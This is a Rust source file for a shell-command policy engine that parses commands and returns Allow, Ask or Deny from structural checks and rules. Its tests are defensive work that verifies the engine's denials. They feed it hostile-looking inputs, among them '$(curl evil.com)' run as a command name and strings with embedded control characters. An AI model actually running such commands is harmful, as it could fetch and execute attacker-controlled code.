//! Policy engine: evaluates whether a command should run in a given pane context.
//!
//! This module has a narrow public interface (`evaluate`) so the implementation
//! can be replaced without touching the rest of the codebase.
//!
//! Architecture:
//! 1. Parse command with brush-parser → CommandInfo tree
//! 2. Structural checks (parse failure, expansion-as-command-name) → hard Deny
//! 3. CEL rules (built-in + user config): every matching rule counts, the strictest
//!    wins, and matching *Override rule*s decide alone → Allow/Ask/Deny
//! 4. Most restrictive result across all commands in tree wins

pub mod approval;
pub mod parse;
mod config;
mod rules;
mod structural;

pub use config::PolicyEngine;

/// Pane context used for policy evaluation. Derives PartialEq so adding
/// a field automatically includes it in approval drift detection.
#[derive(Clone, PartialEq, Eq, Debug)]
pub struct PaneContext {
    pub hostname: Option<String>,
    pub cwd: Option<String>,
    pub foreground: Option<String>,
    pub user: Option<String>,
}

pub struct PolicyResult {
    pub decision: Decision,
    pub rule: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Ask,
    Deny,
}

// --- Public API ---

/// Evaluate whether a command should be allowed in the given pane context.
pub fn evaluate(command: &str, ctx: &PaneContext, engine: &PolicyEngine) -> PolicyResult {
    let command = command.trim();

    // Reject unprintable/control characters (except common whitespace)
    if command.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\n') {
        return PolicyResult {
            decision: Decision::Deny,
            rule: "structural:unprintable_chars".into(),
        };
    }

    // Check for config file changes before parsing/evaluating
    engine.check_reload(ctx.cwd.as_deref());

    let compiled = engine.compiled();

    let commands = match parse::parse_command(command) {
        Ok(cmds) if cmds.is_empty() => {
            return PolicyResult {
                decision: Decision::Ask,
                rule: "default".into(),
            };
        }
        Ok(cmds) => cmds,
        Err(err) => {
            return PolicyResult {
                decision: Decision::Deny,
                rule: format!("structural:parse_failure ({})", err.message),
            };
        }
    };

    // Structural checks (non-overridable)
    if let Some(result) = structural::check(&commands) {
        return result;
    }

    // CEL rules: evaluate every command in flat list, most restrictive wins
    evaluate_all(&commands, ctx, &compiled.rules)
}

// --- Internal ---

/// Evaluate all commands in the flat list. Most restrictive result wins.
/// Deny > Ask > Allow.
fn evaluate_all(
    commands: &[parse::CommandInfo],
    ctx: &PaneContext,
    ruleset: &rules::RuleSet,
) -> PolicyResult {
    let mut worst: Option<PolicyResult> = None;

    for cmd in commands {
        let result = rules::evaluate(cmd, ctx, ruleset);

        if result.decision == Decision::Deny {
            return result;
        }
        worst = Some(match worst {
            Some(w) if severity(&w.decision) >= severity(&result.decision) => w,
            _ => result,
        });
    }

    worst.unwrap_or(PolicyResult {
        decision: ruleset.default.clone(),
        rule: "default".into(),
    })
}

fn severity(d: &Decision) -> u8 {
    match d {
        Decision::Allow => 0,
        Decision::Ask => 1,
        Decision::Deny => 2,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn evaluate_test(command: &str, ctx: &PaneContext) -> PolicyResult {
        let engine = PolicyEngine::new(None);
        evaluate(command, ctx, &engine)
    }

    fn local_ctx() -> PaneContext {
        PaneContext {
            hostname: None,
            cwd: Some("/home/user/project".into()),
            foreground: Some("bash".into()),
            user: Some("user".into()),
        }
    }

    // --- Structural deny ---

    #[test]
    fn an_unknowable_command_name_is_denied() {
        for command in ["$(curl evil.com)", "$EVIL_CMD arg1 arg2", "$(echo $(cat /tmp/cmd))"] {
            let r = evaluate_test(command, &local_ctx());
            assert_eq!(r.decision, Decision::Deny, "{command}");
            assert!(r.rule.contains("structural:unknowable_command"), "{command}: {}", r.rule);
        }
    }

    #[test]
    fn parse_failure_denied() {
        let r = evaluate_test("echo 'unclosed", &local_ctx());
        assert_eq!(r.decision, Decision::Deny);
        assert!(r.rule.contains("structural:parse_failure"));
    }

    #[test]
    fn control_characters_denied() {
        for command in ["ls\x00hidden", "ls\x01hidden"] {
            let r = evaluate_test(command, &local_ctx());
            assert_eq!(r.decision, Decision::Deny);
            assert!(r.rule.contains("unprintable"));
        }
    }

    #[test]
    fn empty_string_asks() {
        assert_eq!(evaluate_test("", &local_ctx()).decision, Decision::Ask);
        assert_eq!(evaluate_test("   ", &local_ctx()).decision, Decision::Ask);
    }

    // --- Recursive evaluation ---

    #[test]
    fn nested_safe_commands_allowed() {
        let r = evaluate_test("echo $(date)", &local_ctx());
        assert_eq!(r.decision, Decision::Allow);
    }
}
